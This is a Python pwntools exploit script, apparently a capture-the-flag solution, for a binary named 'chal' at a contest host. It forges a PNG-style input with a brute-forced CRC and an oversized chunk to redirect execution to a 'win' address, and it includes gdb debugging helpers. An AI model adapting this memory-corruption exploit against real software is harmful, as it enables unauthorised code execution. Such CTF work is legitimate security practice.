from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = 'mc.ax'
PORT = 31412

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def crc(data):
	out = 0xffffffff
	length = len(data)
	
	for i in range(length):
		out ^= ord(data[i])
		for j in range(8):
			if out & 1 == True:
				out = (out >> 1) ^ 0xedb88320
			else:
				out >>= 1
	return out ^ 0xffffffff
		

'''15359
for i in range(0x10000):
	payload = ''
	payload = 'A'*16
	payload +=  '\x00'*0xf
	payload += flat(0x21, 0x4013d7, 0x4014ea)
	payload = ''.join([chr(ord(c) ^ 0xff) for c in payload])
	payload = p32(i) + payload
	val = crc(payload)
	if val & 0xffff == 0x1814:
		print i
		print hexdump(payload)
		print hex(val)
		break
exit()
'''



win = 0x401814

r = start()
if args.D:
	# debug(r, [0x140f])
	# debug(r, [0x14ea])
	# debug(r, [0x144e, 0x1615])
	# debug(r, [0x1549])
	debug(r, [0x15e1, 0x15f9])
	# debug(r, [0x15f9])
	# debug(r, [0x1a3f])

payload = ''
# head
payload += '\x89PNG\x0d\x0a\x1a\x0a'
payload += p32(0x0d, endian='big') # size
payload += 'A'*0x4 # name?
payload += 'A'*0xd # payload?
payload += p32(0x5443b044)

# chunk
payload += p32(0x10+7+0x20, endian='big') # size
data = ''
data += p32(15359)
data = data.ljust(20, 'A')
payload += data

r.sendlineafter('?\n\n', str(len(payload)))
r.sendafter(':\n\n', payload)
r.sendlineafter('?\n', 'y')

r.interactive()
r.close()
